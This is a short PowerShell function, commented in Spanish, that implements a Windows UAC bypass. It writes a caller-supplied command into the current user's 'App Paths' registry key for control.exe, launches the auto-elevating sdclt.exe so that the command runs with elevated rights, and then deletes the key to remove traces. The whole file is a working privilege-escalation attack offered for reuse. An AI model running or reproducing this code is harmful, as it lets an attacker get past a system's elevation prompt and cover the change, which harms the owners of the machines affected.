function Invoke-AppPathBypass {

    Param (

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command
      
    )

    # Comprobamos si existe la ruta del registro del usurio, si no existe la creamos.
     $registro="HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
     if( !Test-Path $registro)
{
    New-Item $registro -Force | New-ItemProperty -Name '(default)' -Value $Command -PropertyType string -Force | Out-Null

}    
# Iniciamos el servvicio 

Start-Process sdclt.exe

# Damos una pausa y eliminamos la clave de resgistro
 sleep 5      
 Remove-Item $registro -Recurse -Force
 echo "Eliminada clave de registro"
        
}
